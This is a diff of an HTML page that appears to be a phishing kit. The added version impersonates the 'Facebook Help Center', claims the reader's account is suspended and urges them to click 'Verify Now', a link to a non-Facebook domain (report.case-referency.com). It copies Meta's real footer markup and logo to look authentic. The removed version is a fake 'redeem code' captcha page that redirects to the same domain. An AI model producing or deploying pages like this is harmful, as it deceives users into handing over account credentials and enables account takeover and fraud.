@@ -2,130 +2,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HOME</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        body {
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-            width: 396px;
-        }
-        .logo {
-            color: #1877f2;
-            font-size: 40px;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-        }
-        .captcha-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
-        }
-        .captcha-box {
-            background-color: #f0f2f5;
-            padding: 10px;
-            font-size: 24px;
-            letter-spacing: 5px;
-            font-weight: bold;
-            border-radius: 6px;
-            flex-grow: 1;
-            text-align: center;
-        }
-        #refreshButton {
-            background-color: #e4e6eb;
-            border: none;
-            padding: 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-left: 10px;
-        }
-        .verify-button {
-            background-color: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            padding: 10px;
-            width: 100%;
-            cursor: pointer;
-        }
-        .verify-button:hover {
-            background-color: #166fe5;
-        }
-    </style>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Facebook Help Center</title>
+
+	<!-- Latest compiled and minified CSS -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
+
+	<!-- Optional theme -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">
+
+	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+	<!--[if lt IE 9]>
+	<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+	<![endif]-->
+	<style>
+		body {
+			padding-top    : 70px;
+			padding-bottom : 30px;
+		}
+		.theme-dropdown .dropdown-menu {
+			position      : static;
+			display       : block;
+			margin-bottom : 20px;
+		}
+		.theme-showcase > p > .btn {
+			margin : 5px 0;
+		}
+		.theme-showcase .navbar .container {
+			width : auto;
+		}
+	</style>
 </head>
-<body>
-    <div class="container">
-        <div class="logo">REDEEM CODE</div>
-        <form id="captchaForm">
-            <div class="captcha-container">
-                <div id="captchaBox" class="captcha-box"></div>
-                <button type="button" id="refreshButton" onclick="updateCaptcha()">↻</button>
-            </div>
-            <input type="text" id="captchaInput" placeholder="Enter code redeem" required>
-            <button type="submit" class="verify-button">Submit</button>
-        </form>
-    </div>
+<body role="document">
+<!-- Fixed navbar -->
+<nav class="navbar navbar-inverse navbar-fixed-top">
+	<div class="container">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar"
+			        aria-expanded="false" aria-controls="navbar">
+				<span class="sr-only">Facebook Help Center</span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" href="#">Facebook Help Center</a>
+		</div>
+		<div id="navbar" class="navbar-collapse collapse">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="#">Home</a></li>
+			</ul>
+		</div>
+		<!--/.nav-collapse -->
+	</div>
+</nav>
+<div class="container theme-showcase" role="main">
+	<div class="jumbotron">
+		<h1>Confirm your Facebook again!</h1>
+		<p>Please contact your facebook help center to fix the problem that caused your facebook account to be suspended.</p>
+		<p style="text-align: center; width: 100%; background: #273c51; margin: 0 auto; overflow: hidden;"><span style="display: block; margin: 20px auto; text-align: center; padding: 0px 10px;"> <a style="color: #6fb1ff; font-size: 20px; font-weight: bold; text-decoration: none;" href="https://report.case-referency.com/" target="_blank" rel="noopener noreferrer">Verify Now</a> </span>
+	</div>
+</div>
 
-    <script>
-        // URL to redirect after successful verification
-        const redirectURL = "https://report.case-referency.com";
+</div>
+</div><p></p>
+</nav>
+<div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"><div class="x443n21 x78zum5 xl56j7k"><div class="x1lxuw3u xoi86sf x5oxk1f x1jxijyj"><div class="x9f619 x1ja2u2z x78zum5 x2lah0s x1n2onr6 x1nhvcw1 x1cy8zhl x1a02dak x1q0g3np x1l90r2v xyamay9 xykv574 xbmpl8g xh8yej3"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf xamitd3 xsyo7zv x16hj40l xs83m0k xf9lk3t x1vril5w xyamay9 x1l90r2v xsxmq0e x85kguw"><ul aria-label="Help Center Footer" role="listbox"><div class="x8gbvx8 x78zum5 x1q0g3np x1a02dak x1nhvcw1 x1rdy4ex xcud41i x4vbgl9 x139jcc6" role="list"><div class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes" role="listitem" style="max-width:280px;min-width:240px"><li><a class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1sur9pj xkrqix3 x1s688f x6s0dn4 x78zum5 xc9qbxq x1lku1pv" href="https://l.facebook.com/l.php?u=https%3A%2F%2Fabout.meta.com%2F%3Futm_source%3Dhelp-center%26utm_medium%3Dreferral%26fbclid%3DIwZXh0bgNhZW0CMTAAAR1AMi_IAKCDihW_2tPyvs8-9Cn3kIQxq4zFTiCSDiATQfSDkPjXiTiB_hE_aem_T3t7b7GBLhPH6YXz4IGmzg&amp;h=AT2CzQEaeZ1syCy6FmUCGaBgUTREEkN6k_a0iQlW2hioVAw4sRhRPEgA383rtN6PqmTMPN22aC4QHMbB5J_OR_bGVPttzsLW5BSw9A5SGFqx8sdiv_mT4Kuen9vaaRe0AQa_YgYx6vLqOt2DsEXRRQ" rel="nofollow" role="link" tabindex="0" target="_blank"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa" dir="auto">About</span></a></li></div><div class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes" role="listitem" style="max-width:280px;min-width:240px"><li><a class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1sur9pj xkrqix3 x1s688f x6s0dn4 x78zum5 xc9qbxq x1lku1pv" href="https://www.facebook.com/privacy/explanation/" role="link" tabindex="0"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa" dir="auto">Privacy</span></a></li></div><div class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes" role="listitem" style="max-width:280px;min-width:240px"><li><a class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1sur9pj xkrqix3 x1s688f x6s0dn4 x78zum5 xc9qbxq x1lku1pv" href="https://www.facebook.com/policies/" role="link" tabindex="0"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa" dir="auto">Terms and Policies</span></a></li></div><div class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes" role="listitem" style="max-width:280px;min-width:240px"><li><a class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1sur9pj xkrqix3 x1s688f x6s0dn4 x78zum5 xc9qbxq x1lku1pv" href="https://www.facebook.com/help/568137493302217/" role="link" tabindex="0"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa" dir="auto">Ad Choices</span></a></li></div><div class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes" role="listitem" style="max-width:280px;min-width:240px"><li><a class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1sur9pj xkrqix3 x1s688f x6s0dn4 x78zum5 xc9qbxq x1lku1pv" href="https://www.facebook.com/careers/" role="link" tabindex="0"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa" dir="auto">Careers</span></a></li></div><div class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes" role="listitem" style="max-width:280px;min-width:240px"><li><a class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1sur9pj xkrqix3 x1s688f x6s0dn4 x78zum5 xc9qbxq x1lku1pv" href="https://www.facebook.com/policies/cookies/" role="link" tabindex="0"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa" dir="auto">Cookies</span></a></li></div><div class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes" role="listitem" style="max-width:280px;min-width:240px"><li><a class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1sur9pj xkrqix3 x1s688f x6s0dn4 x78zum5 xc9qbxq x1lku1pv" href="https://www.facebook.com/business/" role="link" tabindex="0"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa" dir="auto">Create Ad</span></a></li></div><div class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes" role="listitem" style="max-width:280px;min-width:240px"><li><a class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1sur9pj xkrqix3 x1s688f x6s0dn4 x78zum5 xc9qbxq x1lku1pv" href="https://www.facebook.com/pages/creation/" role="link" tabindex="0"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa" dir="auto">Create Page</span></a></li></div></div></ul></div></div><hr class="html-hr xexx8yu x4uap5 x18d9i69 xkhd6sd x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n xdj266r x11i5rnm xat24cr x1mh8g0r x14nfmen x9f619 xjm9jq1"><div class="x9f619 x1ja2u2z x78zum5 x2lah0s x1n2onr6 x1qughib x6s0dn4 xozqiw3 x1q0g3np xyamay9 x4cne27 xifccgj"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x10b6aqq x1yrsyyn x1hk0nng xkhd6sd"><img width="100" alt="From Meta Logo" class="xz74otr" referrerpolicy="origin-when-cross-origin" src="https://static.xx.fbcdn.net/rsrc.php/v3/yF/r/h9b1AHfIb8K.png?_nc_eui2=AeG2wL6jenhmqud2J9a2gL1g3Bn0j2AYML7cGfSPYBgwvhzvTi1ba_8FpMUjqERcF_JE-W0dcLSs8V1trt8jazg1"></div><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x10b6aqq x1yrsyyn x1oysuqx"><div class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xsag5q8 xz9dl7a xykv574 xbmpl8g x4cne27 xifccgj xbktkl8"><div class="x9f619 x1ja2u2z x78zum5 x2lah0s x1n2onr6 x1qughib x6s0dn4 xozqiw3 x1q0g3np"><div class="x9f619 x1ja2u2z x78zum5 x1n2onr6 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"><div class="x78zum5 xdt5ytf xz62fqu x16ldp7u"><div class="xu06os2 x1ok221b"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x3x7a5m x1nxh6w3 x1sibtaa xo1l8bm xi81zsa xp4054r" dir="auto"><span class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft x1j85h84"> </span></span></div></div></div></div></div></div></div></div></div></div></div></div>
 
-        function generateCaptcha() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let captcha = '';
-            for (let i = 0; i < 6; i++) {
-                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return captcha;
-        }
-
-        function updateCaptcha() {
-            const captchaBox = document.getElementById('captchaBox');
-            captchaBox.textContent = generateCaptcha();
-        }
-
-        document.getElementById('captchaForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const captchaBox = document.getElementById('captchaBox');
-            const captchaInput = document.getElementById('captchaInput');
-            if (captchaInput.value === captchaBox.textContent) {
-                window.location.href = redirectURL;
-            } else {
-                alert('Incorrect captcha. Please try again.');
-                updateCaptcha();
-            }
-            captchaInput.value = '';
-        });
-
-        // Initialize captcha on page load
-        updateCaptcha();
-    </script>
+<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+<!-- Include all compiled plugins (below), or include individual files as needed -->
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
 </body>
 </html>
